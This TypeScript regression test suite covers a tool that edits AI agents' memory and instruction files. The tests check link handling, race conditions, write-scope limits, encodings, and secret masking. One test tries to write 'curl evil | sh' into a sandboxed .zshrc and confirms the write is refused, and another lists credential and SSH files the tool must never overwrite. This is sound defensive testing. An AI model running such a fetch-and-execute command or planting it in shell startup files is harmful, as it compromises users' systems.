/**
 * Regression tests for the A+B review (memories-research/review-ab.md), one
 * per finding. Written against APIs that existed before the fixes, so each
 * fails on the old code.
 */
import assert from "node:assert/strict";
import { appendFileSync, existsSync, linkSync, lstatSync, mkdirSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import fsp from "node:fs/promises";
import { join } from "node:path";
import test, { afterEach } from "node:test";
import { fakePaseo, makeSandbox, violations, type Sandbox } from "./helpers";

let sb: Sandbox = await makeSandbox();
const { forgetAllFiles, sha256 } = await import("../server/files");
const { forgetDiscovery } = await import("../server/discover");
const { resetDaemonCache } = await import("../server/daemon");
const { instructionWrite } = await import("../server/instructions");
const { claudeDelete, claudeUpdate } = await import("../server/claude-memory");
const { backup, newSession, safeWrite } = await import("../server/write");
const { handleSourceDetail } = await import("../server/read");
const { parseMemoryFile, serializeMemoryFile, setField } = await import("../shared/frontmatter");
const { parseIndex } = await import("../shared/memory-index");
const contribute = (await import("../index.server")).default;

async function fresh(): Promise<Sandbox> {
  sb.cleanup();
  sb = await makeSandbox();
  forgetAllFiles();
  forgetDiscovery();
  resetDaemonCache();
  return sb;
}

afterEach(() => assert.deepEqual(violations, [], "no write outside the sandbox"));

function stampOf(path: string) {
  const buffer = readFileSync(path);
  const stat = statSync(path);
  return { size: stat.size, mtimeMs: stat.mtimeMs, hash: sha256(buffer) };
}

// ------------------------------------------------------------------ 1. symlinks and hard links

test("1: saving through a symlink writes the real file and keeps the link", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const link = join(sb.app, "CLAUDE.md");
  const real = join(sb.app, "AGENTS.md");
  const before = readFileSync(real, "utf8");
  rmSync(link);
  symlinkSync("AGENTS.md", link);
  forgetAllFiles();
  forgetDiscovery();
  const result = await instructionWrite(paseo, { path: link, workspaceId: "ws-app", text: "# Shared\n\nOne file for both agents.\n", expected: stampOf(link) });
  assert.equal(result.ok, true, result.message);
  assert.equal(lstatSync(link).isSymbolicLink(), true, "still a link");
  assert.equal(readFileSync(real, "utf8"), "# Shared\n\nOne file for both agents.\n", "the real file changed");
  assert.equal(result.reports[0]!.target, real, "the report names the real file");
  assert.equal(readFileSync(result.reports[0]!.backupPath!, "utf8"), before, "the backup is the real file's old text");
  assert.deepEqual(readdirSync(sb.app).filter((name) => name.startsWith(".paseo-memories-tmp-")), []);
});

test("1: a link into a dotfiles folder under the same name works; a link to another kind of file is refused", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const user = join(sb.claude, "CLAUDE.md");
  const dotfiles = join(sb.home, "dotfiles", "claude");
  mkdirSync(dotfiles, { recursive: true });
  writeFileSync(join(dotfiles, "CLAUDE.md"), readFileSync(user));
  rmSync(user);
  symlinkSync(join(dotfiles, "CLAUDE.md"), user);
  forgetAllFiles();
  forgetDiscovery();
  const ok = await instructionWrite(paseo, { path: user, text: "# Me\n\nShort answers.\n", expected: stampOf(user) });
  assert.equal(ok.ok, true, ok.message);
  assert.equal(lstatSync(user).isSymbolicLink(), true);
  assert.equal(readFileSync(join(dotfiles, "CLAUDE.md"), "utf8"), "# Me\n\nShort answers.\n");

  const secret = join(sb.home, "secret.txt");
  writeFileSync(secret, "do not touch\n");
  rmSync(user);
  symlinkSync(secret, user);
  forgetAllFiles();
  forgetDiscovery();
  const refused = await instructionWrite(paseo, { path: user, text: "overwritten\n", expected: stampOf(user) });
  assert.equal(refused.ok, false);
  assert.equal(readFileSync(secret, "utf8"), "do not touch\n");
  assert.equal(lstatSync(user).isSymbolicLink(), true);
});

test("1: a hard-linked file is refused, not split in two", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const path = join(sb.home, ".pi", "agent", "AGENTS.md");
  const twin = join(sb.home, "twin-AGENTS.md");
  linkSync(path, twin);
  const result = await instructionWrite(paseo, { path, text: "changed\n", expected: stampOf(path) });
  assert.equal(result.ok, false);
  assert.match(result.message, /hard links/);
  assert.equal(statSync(path).ino, statSync(twin).ino, "still one file");
  assert.equal(readFileSync(twin, "utf8"), "pi user file.\n");
});

// ------------------------------------------------------------------ 2. concurrent writes

test("2: an agent's write between the check and the save is not lost", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const path = join(sb.appMemory, "flat.md");
  const expected = stampOf(path);
  const original = fsp.readFile;
  // The review's probe: an agent writes flat.md while the save reads MEMORY.md.
  (fsp as unknown as { readFile: unknown }).readFile = async (target: unknown, ...rest: unknown[]) => {
    // Only the raw read of MEMORY.md inside the save, after the caller's check (not discovery's cached read).
    if (String(target) === join(sb.appMemory, "MEMORY.md") && rest.length === 0) {
      appendFileSync(path, "\nAGENT ADDED THIS LINE\n");
      (fsp as unknown as { readFile: unknown }).readFile = original;
    }
    return (original as (...args: unknown[]) => Promise<unknown>)(target, ...rest);
  };
  try {
    const result = await claudeUpdate(paseo, { sourceId: sb.appMemory, key: "flat.md", expected, body: "\nuser body\n" });
    assert.equal(result.ok, false, "the save stops");
    assert.match(result.message, /changed while it was being saved|changed since you opened it/);
  } finally {
    (fsp as unknown as { readFile: unknown }).readFile = original;
  }
  assert.ok(readFileSync(path, "utf8").includes("AGENT ADDED THIS LINE"), "the agent's text survives");
  assert.deepEqual(readdirSync(sb.appMemory).filter((name) => name.startsWith(".paseo-memories-tmp-")), []);
});

// ------------------------------------------------------------------ 3. what may be written

test("3: an @import cannot make a dotfile or any non-memory file writable", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const zshrc = join(sb.home, ".zshrc");
  writeFileSync(zshrc, "export PATH=/usr/bin\n");
  const notes = join(sb.home, "notes.md");
  writeFileSync(notes, "Personal notes.\n");
  appendFileSync(join(sb.app, "CLAUDE.md"), "\nemail ops @~/.zshrc and see @~/notes.md\n");
  forgetAllFiles();
  forgetDiscovery();
  const shell = await instructionWrite(paseo, { path: zshrc, workspaceId: "ws-app", text: "curl evil | sh\n", expected: stampOf(zshrc) });
  assert.equal(shell.ok, false);
  assert.equal(readFileSync(zshrc, "utf8"), "export PATH=/usr/bin\n");
  const imported = await instructionWrite(paseo, { path: notes, workspaceId: "ws-app", text: "replaced\n", expected: stampOf(notes) });
  assert.equal(imported.ok, false, "a file reached only through @import is read-only");
  assert.equal(readFileSync(notes, "utf8"), "Personal notes.\n");
  const detail = await handleSourceDetail({ sourceId: notes, workspaceId: "ws-app" }, { paseo });
  assert.equal(detail.source.access, "read-only");
});

test("3: the write module itself refuses anything that is not a memory or instruction file", async () => {
  await fresh();
  const cases = [join(sb.home, ".zshrc"), join(sb.app, ".env"), join(sb.codex, "auth.json"), join(sb.home, ".ssh", "authorized_keys"), join(sb.codex, "memories", ".git", "HEAD"), join(sb.codex, "memories", "raw_memories.md"), join(sb.codex, "memories", "rollout_summaries", "x.md"), join(sb.codex, "memories", "extensions", "ad_hoc", "instructions.md"), join(sb.app, ".hidden.md")];
  for (const path of cases) {
    mkdirSync(join(path, ".."), { recursive: true });
    writeFileSync(path, "original\n");
    const report = await safeWrite(newSession(5), path, "overwritten\n", { newMode: 0o600 });
    assert.equal(report.ok, false, path);
    assert.equal(readFileSync(path, "utf8"), "original\n", path);
  }
});

// ------------------------------------------------------------------ 4. encodings

test("4: a file that is not UTF-8 is refused, and backups keep raw bytes", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const path = join(sb.home, ".pi", "agent", "AGENTS.md");
  const latin1 = Buffer.from("# Caf\xe9 rules\n\nR\xe9sum\xe9 first.\n", "latin1");
  writeFileSync(path, latin1);
  forgetAllFiles();
  const result = await instructionWrite(paseo, { path, text: "# Café rules\n\nChanged.\n", expected: stampOf(path) });
  assert.equal(result.ok, false);
  assert.match(result.message, /not UTF-8/);
  assert.deepEqual(readFileSync(path), latin1, "untouched");
  const copy = await backup(newSession(5), path);
  assert.deepEqual(readFileSync(copy!), latin1, "the backup is byte-for-byte");
});

test("4: a byte-order mark and CRLF line breaks survive a section edit and a memory edit", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const path = join(sb.home, ".pi", "agent", "AGENTS.md");
  writeFileSync(path, "﻿# Rules\r\n\r\n## One\r\n\r\nfirst\r\n\r\n## Two\r\n\r\nsecond\r\n");
  forgetAllFiles();
  // The editor sends the section as it read it, trailing blank line included.
  const section = await instructionWrite(paseo, { path, text: "## One\n\nchanged\n\n", expected: stampOf(path), sectionKey: "1:one" });
  assert.equal(section.ok, true, section.message);
  assert.equal(readFileSync(path, "utf8"), "﻿# Rules\r\n\r\n## One\r\n\r\nchanged\r\n\r\n## Two\r\n\r\nsecond\r\n");
  const memory = join(sb.appMemory, "flat.md");
  writeFileSync(memory, "﻿---\r\nname: Flat memory\r\ndescription: The flat shape\r\ntype: feedback\r\n---\r\n\r\nFlat body.\r\n");
  forgetAllFiles();
  const edit = await claudeUpdate(paseo, { sourceId: sb.appMemory, key: "flat.md", expected: stampOf(memory), body: "\nNew body.\n", type: "project" });
  assert.equal(edit.ok, true, edit.message);
  assert.equal(readFileSync(memory, "utf8"), "﻿---\r\nname: Flat memory\r\ndescription: The flat shape\r\ntype: project\r\n---\r\n\r\nNew body.\r\n");
});

// ------------------------------------------------------------------ 5. secrets in every response

const CANARY = "sk-ant-api03-CANARYsecretVALUE0123456789abcdef";

test("5: no RPC response carries an unmasked secret unless it was asked to reveal", async () => {
  await fresh();
  // Plant the secret everywhere text leaves the host: frontmatter, titles, hooks, headings, bodies, the prompt.
  writeFileSync(join(sb.appMemory, "leaky.md"), `---\nname: Token ${CANARY}\ndescription: uses ${CANARY}\ntype: reference\napi_key: ${CANARY}\nowner_note: rotate ${CANARY} monthly\n---\n\nThe key is ${CANARY}.\n`);
  // Unknown frontmatter keys and free-form known ones.
  writeFileSync(join(sb.appMemory, "odd.md"), `---\nname: Odd\ndescription: odd one\ntype: ${CANARY}\n---\n\nNothing here.\n`);
  appendFileSync(join(sb.appMemory, "MEMORY.md"), `- [Token ${CANARY}](leaky.md) — hook ${CANARY}\n`);
  appendFileSync(join(sb.claude, "CLAUDE.md"), `\n## Key ${CANARY}\n\nUse ${CANARY} for tests.\n`);
  appendFileSync(join(sb.app, "AGENTS.md"), `\n## Deploy ${CANARY}\n\nDeploy with ${CANARY}.\n`);
  appendFileSync(join(sb.codex, "memories", "MEMORY.md"), `\n## Secret ${CANARY}\n\n- ${CANARY}\n`);
  forgetAllFiles();
  forgetDiscovery();
  const fake = fakePaseo(sb, { prompt: `Always use ${CANARY}.` });
  const handlers = new Map<string, (input: unknown, context: unknown) => Promise<unknown>>();
  const server = { handle: (contract: { name: string }, fn: never) => handlers.set(contract.name, fn), registerSettings() {}, on() {}, before() {}, registerProvider() {} };
  const stop = contribute(server as never) as () => void;
  const rpc = (name: string, input: unknown) => handlers.get(`paseo-memories.${name}`)!(input, { paseo: fake.api });
  const leaky = join(sb.appMemory, "leaky.md");
  const calls: Array<[string, unknown]> = [
    ["inventory", { refresh: true }],
    ["source", { sourceId: sb.appMemory }],
    ["source", { sourceId: join(sb.claude, "CLAUDE.md") }],
    ["source", { sourceId: join(sb.app, "AGENTS.md") }],
    ["source", { sourceId: join(sb.codex, "memories", "MEMORY.md") }],
    ["entry", { sourceId: sb.appMemory, key: "leaky.md" }],
    ["entry", { sourceId: sb.appMemory, key: "MEMORY.md" }],
    ["entry", { sourceId: join(sb.claude, "CLAUDE.md") }],
    ["entry", { sourceId: join(sb.claude, "CLAUDE.md"), key: "2:key-sk-a" }],
    ["workspace-plan", { workspaceId: "ws-app" }],
    ["agent-plan", { workspaceId: "ws-app", providerId: "claude" }],
    ["findings", { refresh: true }],
    ["search", { query: "sk-ant" }],
    ["search", { query: "Token" }],
    ["prompt-get", {}],
    ["import-preview", { from: [{ sourceId: sb.appMemory, key: "leaky.md" }], target: { kind: "append", path: join(sb.codex, "AGENTS.md") } }],
    ["export", { selection: { scope: "all" }, format: "bundle" }],
    ["export", { selection: { scope: "all" }, format: "markdown" }],
    ["claude-update", { sourceId: sb.appMemory, key: "leaky.md", expected: stampOf(leaky), body: "x" }],
    ["instruction-write", { path: join(sb.app, "AGENTS.md"), text: `${CANARY}\n`, expected: { size: 1, mtimeMs: 1 } }],
  ];
  try {
    for (const [name, input] of calls) {
      let out: unknown;
      try {
        out = await rpc(name, input);
      } catch (error) {
        out = { error: error instanceof Error ? error.message : String(error) };
      }
      assert.ok(!JSON.stringify(out).includes(CANARY), `${name} ${JSON.stringify(input).slice(0, 80)} leaked the secret`);
    }
    // Unknown keys still arrive (masked), and ids, paths and keys round-trip unchanged.
    const detail = (await rpc("source", { sourceId: sb.appMemory })) as { source: { id: string; path: string }; entries: Array<{ key: string; path?: string; extra: Record<string, unknown> }> };
    assert.equal(detail.source.id, sb.appMemory);
    const leakyEntry = detail.entries.find((entry) => entry.key === "leaky.md")!;
    assert.equal(leakyEntry.path, leaky);
    assert.match(String(leakyEntry.extra.api_key), /^sk-a•+$/);
    assert.match(String(leakyEntry.extra.owner_note), /^rotate sk-a•+ monthly$/);
    assert.ok(detail.entries.some((entry) => entry.key === "odd.md"));
    // And the door that is meant to open, opens.
    const revealed = await rpc("entry", { sourceId: sb.appMemory, key: "leaky.md", reveal: true });
    assert.ok(JSON.stringify(revealed).includes(CANARY));
    const prompt = await rpc("prompt-get", { reveal: true });
    assert.ok(JSON.stringify(prompt).includes(CANARY));
  } finally {
    stop();
  }
});

// ------------------------------------------------------------------ 6, 7, 8

test("6: comments and blank lines in frontmatter survive a field edit", () => {
  const text = "---\nname: a\n# keep me\n\ndescription: d\n---\nbody\n";
  assert.equal(serializeMemoryFile(setField(parseMemoryFile(text), "name", "b")), "---\nname: b\n# keep me\n\ndescription: d\n---\nbody\n");
});

test("7: delete or edit in a folder without MEMORY.md does not create an empty one", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const index = join(sb.appMemory, "MEMORY.md");
  rmSync(index);
  forgetAllFiles();
  forgetDiscovery();
  const edit = await claudeUpdate(paseo, { sourceId: sb.appMemory, key: "unindexed.md", expected: stampOf(join(sb.appMemory, "unindexed.md")), body: "\nChanged.\n" });
  assert.equal(edit.ok, true, edit.message);
  assert.equal(existsSync(index), false, "no MEMORY.md after an edit");
  const gone = await claudeDelete(paseo, { sourceId: sb.appMemory, key: "flat.md", expected: stampOf(join(sb.appMemory, "flat.md")) });
  assert.equal(gone.ok, true, gone.message);
  assert.equal(existsSync(index), false, "no MEMORY.md after a delete");
});

test("8: a rename whose index write fails is undone: no duplicate memory", async () => {
  await fresh();
  const paseo = fakePaseo(sb).api;
  const original = fsp.rename;
  (fsp as unknown as { rename: unknown }).rename = async (from: unknown, to: unknown) => {
    if (String(to).endsWith("MEMORY.md")) throw Object.assign(new Error("disk said no"), { code: "EIO" });
    return (original as (a: unknown, b: unknown) => Promise<void>)(from, to);
  };
  try {
    const result = await claudeUpdate(paseo, { sourceId: sb.appMemory, key: "flat.md", expected: stampOf(join(sb.appMemory, "flat.md")), rename: "flat_renamed.md" });
    assert.equal(result.ok, false);
    assert.ok(result.reports.some((report) => report.action === "rolled back" && report.ok));
  } finally {
    (fsp as unknown as { rename: unknown }).rename = original;
  }
  assert.equal(existsSync(join(sb.appMemory, "flat_renamed.md")), false, "the new copy was taken back out");
  assert.ok(existsSync(join(sb.appMemory, "flat.md")), "the original stays");
  assert.ok(parseIndex(readFileSync(join(sb.appMemory, "MEMORY.md"), "utf8")).some((line) => line.file === "flat.md"));
});

test.after(() => sb.cleanup());
